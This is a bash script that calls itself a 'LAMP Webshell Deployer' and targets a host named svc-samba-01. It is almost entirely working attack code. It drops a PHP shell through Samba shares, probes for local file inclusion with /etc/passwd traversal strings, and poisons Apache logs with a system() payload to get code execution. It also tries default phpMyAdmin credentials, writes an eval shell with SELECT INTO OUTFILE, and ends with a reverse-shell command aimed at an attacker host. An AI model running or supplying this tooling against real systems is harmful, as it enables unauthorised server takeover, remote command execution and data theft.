#!/bin/bash
# deploy_lamp_shell.sh — LAMP stack webshell deployer
# Target: svc-samba-01 (Ubuntu 24.04, LAMP stack)
# Methods:
#   1. Upload shell via Samba write access (SMB → Apache webroot)
#   2. SSH drop if creds are known
#   3. LFI probe → log poisoning (Apache access/error logs)
#   4. PHPMyAdmin upload if accessible
# Usage: ./deploy_lamp_shell.sh <target_ip> [smb_user] [smb_pass] [web_port]

TARGET="${1:?Usage: $0 <target_ip> [smb_user] [smb_pass] [web_port]}"
SMB_USER="${2:-guest}"
SMB_PASS="${3:-}"
WEB_PORT="${4:-80}"
SHELL_PASS="rt2025!delta"

BASE_URL="http://${TARGET}:${WEB_PORT}"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SHELL_FILE="${SCRIPT_DIR}/shell.php"

echo "[*] === LAMP Webshell Deployer ==="
echo "[*] Target : $TARGET"
echo ""

# ── Method 1: Samba → Apache webroot ─────────────────────────────────────────
echo "[*] [1] Enumerating Samba shares..."
SHARES=$(smbclient -L "//${TARGET}" -U "${SMB_USER}%${SMB_PASS}" --no-pass 2>/dev/null \
    | grep "Disk\|disk" | awk '{print $1}')
echo "[*]   Shares: $(echo $SHARES | tr '\n' ' ')"

# Common webroot share names
for SHARE in www html web webroot public_html www-data; do
    echo "[*]   Trying share: $SHARE"
    RESULT=$(smbclient "//${TARGET}/${SHARE}" -U "${SMB_USER}%${SMB_PASS}" \
        -c "put \"${SHELL_FILE}\" shell.php" 2>&1)
    if echo "$RESULT" | grep -q "NT_STATUS" && ! echo "$RESULT" | grep -q "ACCESS_DENIED\|OBJECT_NAME_NOT_FOUND"; then
        echo "[+]   Shell uploaded to //${TARGET}/${SHARE}/shell.php"
        echo "[+]   URL: ${BASE_URL}/shell.php?p=${SHELL_PASS}&c=id"
    elif echo "$RESULT" | grep -q "putting file"; then
        echo "[+]   Uploaded to share $SHARE"
        echo "[+]   URL: ${BASE_URL}/shell.php?p=${SHELL_PASS}&c=id"
    fi
done

# Try each enumerated share
for SHARE in $SHARES; do
    RESULT=$(smbclient "//${TARGET}/${SHARE}" -U "${SMB_USER}%${SMB_PASS}" \
        -c "put \"${SHELL_FILE}\" shell.php" 2>&1)
    if echo "$RESULT" | grep -q "putting file"; then
        echo "[+]   Shell dropped to SMB share: $SHARE"
    fi
done

# ── Method 2: LFI probe ───────────────────────────────────────────────────────
echo ""
echo "[*] [2] Probing for LFI vulnerabilities..."
LFI_PATHS=(
    "?page=../../../etc/passwd"
    "?file=../../../etc/passwd"
    "?include=../../../etc/passwd"
    "?path=../../../etc/passwd"
    "?view=../../../etc/passwd"
    "?doc=../../../etc/passwd"
    "?lang=../../../etc/passwd%00"
)

for PATH_TEST in "${LFI_PATHS[@]}"; do
    RESP=$(curl -s "${BASE_URL}/${PATH_TEST}" --max-time 5)
    if echo "$RESP" | grep -q "root:x:0:0"; then
        echo "[+] LFI found: ${BASE_URL}/${PATH_TEST}"
        LFI_URL="${BASE_URL}/${PATH_TEST}"

        # Log poisoning via User-Agent
        echo "[*]   Poisoning Apache access log with PHP payload..."
        POISON_UA="<?php @system(\$_GET['c']); ?>"
        curl -sA "$POISON_UA" "${BASE_URL}/" > /dev/null 2>&1

        # Common Apache log paths
        for LOG in "/var/log/apache2/access.log" "/var/log/apache2/error.log" \
                   "/var/log/httpd/access.log" "/proc/self/environ"; do
            LOG_ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$LOG'))")
            TEST=$(curl -s "${BASE_URL}/?page=../../../..${LOG}&c=id" --max-time 5)
            if echo "$TEST" | grep -qE "uid=[0-9]+"; then
                echo "[+]   Log poisoning RCE works via $LOG"
                echo "[+]   Shell: ${BASE_URL}/?page=../../../..${LOG}&c=<cmd>"
            fi
        done
        break
    fi
done

# ── Method 3: PHPMyAdmin probe + upload ──────────────────────────────────────
echo ""
echo "[*] [3] Probing PHPMyAdmin..."
for PMA_PATH in /phpmyadmin /pma /phpMyAdmin /mysql /adminer.php; do
    PMA_RESP=$(curl -s -o /dev/null -w "%{http_code}" "${BASE_URL}${PMA_PATH}" --max-time 5)
    if [[ "$PMA_RESP" =~ ^(200|301|302)$ ]]; then
        echo "[+]   PHPMyAdmin found at: ${BASE_URL}${PMA_PATH}"
        # Try default creds
        for CRED in "root:" "root:root" "root:toor" "admin:admin" "pma:pma"; do
            PMA_U=$(echo "$CRED" | cut -d: -f1)
            PMA_P=$(echo "$CRED" | cut -d: -f2)
            LOGIN=$(curl -s -c /tmp/pma_cookie -b /tmp/pma_cookie \
                -d "pma_username=${PMA_U}&pma_password=${PMA_P}&server=1" \
                "${BASE_URL}${PMA_PATH}/index.php" --max-time 5)
            if echo "$LOGIN" | grep -q "pma_navigation\|logout\|server_databases"; then
                echo "[+]   PHPMyAdmin login: $PMA_U / $PMA_P"
                # Use SELECT INTO OUTFILE to write shell (requires FILE privilege)
                # Requires knowing the webroot path
                OUTFILE=$(curl -s -c /tmp/pma_cookie -b /tmp/pma_cookie \
                    "${BASE_URL}${PMA_PATH}/sql.php" \
                    -d "sql_query=SELECT+'<?php+@eval(\$_REQUEST[\"c\"]);+?>'+INTO+OUTFILE+'/var/www/html/x.php'&server=1&db=information_schema" \
                    --max-time 5)
                if curl -s "${BASE_URL}/x.php?c=echo%20shell_ok" --max-time 5 | grep -q "shell_ok"; then
                    echo "[+]   SQL shell written to ${BASE_URL}/x.php"
                fi
                break
            fi
        done
    fi
done

# ── Method 4: Direct file upload via curl if writable webroot ────────────────
echo ""
echo "[*] [4] Trying common upload endpoints..."
UPLOAD_PATHS=("/upload.php" "/upload/" "/uploads/" "/admin/upload.php" "/wp-content/uploads/")
for UP in "${UPLOAD_PATHS[@]}"; do
    RESP=$(curl -s -o /dev/null -w "%{http_code}" \
        -F "file=@${SHELL_FILE};type=image/jpeg" \
        "${BASE_URL}${UP}" --max-time 5)
    if [[ "$RESP" =~ ^(200|201)$ ]]; then
        echo "[+]   Possible upload endpoint: ${BASE_URL}${UP} ($RESP)"
    fi
done

echo ""
echo "[*] === LAMP Deployment Summary ==="
echo "    Shell password : $SHELL_PASS"
echo "    SMB upload     : ${BASE_URL}/shell.php?p=${SHELL_PASS}&c=id"
echo "    LFI/log poison : see above if LFI found"
echo "    PHPMyAdmin     : see above if pma found"
echo ""
echo "    Reverse shell  : curl '...?p=${SHELL_PASS}&act=revshell&rh=<LHOST>&rp=4444'"
